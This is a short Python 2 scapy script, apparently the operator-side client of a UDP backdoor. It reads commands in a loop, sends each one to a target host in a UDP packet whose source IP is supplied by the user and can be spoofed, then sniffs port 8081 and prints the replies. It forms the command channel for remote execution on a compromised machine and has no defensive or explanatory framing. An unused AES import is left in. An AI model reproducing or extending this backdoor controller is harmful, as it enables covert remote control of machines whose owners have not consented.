import argparse
from scapy.all import *
from Crypto.Cipher import AES
from scapy.layers.inet import IP, UDP


#Argparse setup
parser = argparse.ArgumentParser(description="Backdoor")
parser.add_argument('-d', '--dest', dest='dest', help='Destination IP', required=True)
parser.add_argument('-p', '--port', dest='port', help='Destination Port', required=True)
parser.add_argument('-s', '-source', dest='source_ip', help='Source IP', required=True)
parser.add_argument('-sp', '-source_port', dest='source_port', help='Source Port', required= True)
args = parser.parse_args()


def stp_filter(packet):
        print packet['Raw'].load
        return True



def main():


#Main command and display loop
    while 1:
            command = raw_input("Command to send:") + "#" + args.source_ip
            #print (command)
            packet = IP(dst=args.dest, src=args.source_ip)/UDP(sport=int(args.source_port), dport=int(args.port))/command
            #print packet['Raw'].load
            send(packet)
            sniff(filter="udp and src port " + args.port + " and dst port 8081", stop_filter=stp_filter)

if __name__ == '__main__':
	main()